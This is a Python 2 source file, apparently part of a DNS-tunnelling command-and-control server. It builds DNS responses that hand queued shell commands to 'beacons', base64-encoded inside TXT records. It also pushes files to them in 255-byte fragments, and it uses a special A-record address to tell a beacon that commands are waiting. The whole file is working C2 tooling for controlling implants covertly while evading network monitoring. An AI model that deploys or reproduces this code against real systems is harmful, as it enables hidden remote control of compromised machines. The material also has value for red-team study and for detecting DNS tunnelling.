"""
    File containing classes and functions to handle a DNS Response
    @author Dosh, JRoc
"""
import struct, base64

"""
    Class to represent a DNS Response and functions to build it
"""
class DNSResponse:
    """
        Init function to create the class
        
        addr - the address to send the packet too.
        txt - boolean value whether it's a txt record or not      
        server - the server sending the query
        chk - if the beacon checking in has commands queued up
    """
    def __init__(self, addr, txt, server, chk):
        self.addr = addr
        self.packet = None
        self.txt = txt
        self.commands = server.commands # commands to execute
        self.beacons = server.bList     # list of beacons to send to
        self.f = server.f               # if file is present
        self.fName = server.fName       # name of file
        self.fSize = server.fSize       # size of file to load
        self.curr = 0                   # current position in file
        self.red = 0                    # number of bytes read in the file
        self.server = server
        self.frag = False               # if the file needs to be fragmented
        self.sendName = False           # if were sending the file name to the beacon
        self.sendAll = server.sendAll   # send commands to any beacon
        self.chk = chk

    """
        Packs data into a binary struct to send as a
        response to the original query.

        url - the address of the answer
        qID - the queryID of the origina query
    """
    def create_packet(self, url, qID):
        self.packet = struct.pack("!H", qID) # Q ID
        if self.frag:
            self.packet += struct.pack("!H", 34240) # 34240 if fragment file( Z bit set)
        else:
            self.packet += struct.pack("!H", 34176) # Flags
        self.packet += struct.pack("!H", 1) # Questions
        self.packet += struct.pack("!H", 1) # Answers
        self.packet += struct.pack("!H", 0) # Authorities
        self.packet += struct.pack("!H", 0) # Additional
        tmp_url = url.split(".")
        for x in tmp_url:
            self.packet += struct.pack("B", len(x)) # Store length of name
            self.packet += ''.join(struct.pack("c", byte) for byte in bytes(x)) # Loop & store name
        self.packet += struct.pack("B", 0) # Terminate name
        if self.txt:
            self.packet += struct.pack("!H", 16) # Q TXT Type
        else:
            self.packet += struct.pack("!H", 1) # Q A Type
        self.packet += struct.pack("!H", 1) # Q Class
        self.create_answer(url)

    """
        Creates the answer section of the DNS response

        record - the record to include in the name section
    """
    def create_answer(self, record):
        tmp_record = record.split(".")
        for x in tmp_record:
            self.packet += struct.pack("B", len(x)) # Store length of name
            self.packet += ''.join(struct.pack("c", byte) for byte in bytes(x)) # Loop & store name
        self.packet += struct.pack("B", 0) # Terminate name
        if self.txt:
            self.packet += struct.pack("!H", 16) # TXT type, 2 bytes
        else:
            self.packet += struct.pack("!H", 1) # A Type 2 bytes
        self.packet += struct.pack("!H", 1) # Class 2 bytes
        self.packet += struct.pack("!I", 1) # TTL 4 bytes
        if self.txt:    # load command
            if self.sendName:
                self.send_file_name(self.fName)
            elif self.f:
                self.load_file(self.fName)
                if self.fSize == 0: # read the whole file, reset now
                    self.frag = False
                    self.server.f = False
                    self.server.fName = None
                    self.curr = 0
            else:
                if self.sendAll:
                    full = ';'.join(cmd for cmd in self.commands) # concat commands with semicolon
                    full = base64.b64encode(full)
                    length = len(full)
                    self.packet += struct.pack("!H", length + 1) # RDLENGTH(cmd length) + txt length field
                    self.packet += struct.pack("B", length) # TXT Length(cmd lengths)
                    self.packet += ''.join(struct.pack("c", x) for x in full) # loop & store command
                else:
                    found = None
                    for x in self.beacons:  # look through all the beacons queued up
                        if self.addr[0] == x.ip:  # beacon was in the list, send its commands
                            found = x
                            full = ';'.join(cmd for cmd in x.cmds) # concat commands with semicolon
                            full = base64.b64encode(full)
                            length = len(full)
                            self.packet += struct.pack("!H", length + 1) # RDLENGTH(cmd length) + txt length field
                            self.packet += struct.pack("B", length) # TXT Length(cmd lengths)
                            self.packet += ''.join(struct.pack("c", x) for x in full) # loop & store command
                            
                    if found == None:   # valid beacon wasnt found
                        self.packet += struct.pack("!H", 1) #RDLENGTH
                        self.packet += struct.pack("B", 0)  #TXT LENGTH
                    else:
                        self.beacons.remove(found)   # remove beacon from list 

        else:   # load IP for A record
            if self.chk:
                self.packet += struct.pack("!H", 4) # RDLENGTH 2 bytes
                self.packet += struct.pack("!I", 16843009)  # RDATA, IP address saying the beacon has cmds
            else:
                self.packet += struct.pack("!H", 4) # RDLENGTH 2 bytes
                self.packet += struct.pack("!I", 2165670612)  # RDATA, should be IP address from A record
        

    """
        Sends the file name to the client so that it knows 
        that its a file being sent and not regular commands

        f - the name of the file
    """
    def send_file_name(self, f):
        msg = "file " + f
        msg = base64.b64encode(msg)
        self.packet += struct.pack("!H", len(msg) + 1) #RDLENGTH length of file name
        self.packet += struct.pack("B", len(msg)) #TXTLENGTH 
        self.packet += ''.join(struct.pack("c", x) for x in msg) # loop and store name

    """
        Loads the data from a file into the DNS packet,
        fragmenting it if the packet is too large

        f - the name of the file to open
    """
    def load_file(self, f):
    
        f = open(f, 'rb')
        if self.frag:
            # full packet will be filled
            if (self.fSize - self.red) >= 255:
                self.packet += struct.pack("!H", 256) #RDLENGTH max file length
                self.packet += struct.pack("B", 255) #TXTLENGTH(file length)
            # remaining data of the file
            else:
                self.frag = False
                self.packet += struct.pack("!H", self.fSize + 1) # RDLENGTH
                self.packet += struct.pack("B", self.fSize) # TXTLENTH
        else:
            self.packet += struct.pack("!H", self.fSize + 1) # RDLENGTH(file length) + txt length field
            self.packet += struct.pack("B", self.fSize) # TXT Length(file length)

        f.seek(self.curr) # go back to current position
        l = f.read(1)
        while l:
            if self.red == 255:        # file to big, need to fragment
                break
            self.packet += struct.pack("c", l) # load each byte of the packet
            l = f.read(1)
            self.red += 1
            self.curr += 1
        self.fSize -= self.red # remove number of bytes read from total size
        #print self.fSize
        self.red = 0           # reset number of bytes read to zero
        f.close()
        

"""
    Function to answer a DNS query with the correct record.

    addr - the address to send the response to
    server - the class representing the mini dns server
    dnsQuery - the class represnting the query being answered
    txt - boolean value for if its a txt record or not
"""
def send_response(addr, server, dnsQuery, txt):
    packet_num = 1
    print "Sending response"
    chk = False
    if dnsQuery.checkin: 
        for x in server.bList:
            if x.ip == addr[0]:
                chk = True
        if not chk:
            server.add_beacon(addr[0])

    response = DNSResponse(addr, txt, server, chk)
    if response.f:
        #send over file name
        response.sendName = True
        response.create_packet(dnsQuery.fullNames[0], dnsQuery.qID)
        server.sock.sendto(bytes(response.packet), addr)
        response.sendName = False
        # send actual file
        if response.fSize > 256:  # file is too large, needs to be fragmented
            response.frag = True  # notify response
            while response.frag:  # loop until packet is fully fragmented
                if response.fSize <= 255: response.frag = False # last packet
                response.create_packet(dnsQuery.fullNames[0], dnsQuery.qID)
                server.sock.sendto(bytes(response.packet), addr)
                print "Sent packet %d..." % packet_num
                packet_num += 1
        else:
            response.create_packet(dnsQuery.fullNames[0], dnsQuery.qID)
            server.sock.sendto(bytes(response.packet), addr)
    else:
        response.create_packet(dnsQuery.fullNames[0], dnsQuery.qID)
        server.sock.sendto(bytes(response.packet), addr)

    server.bList = response.beacons     # update list if any were removed
    print addr
    print "Response sent"
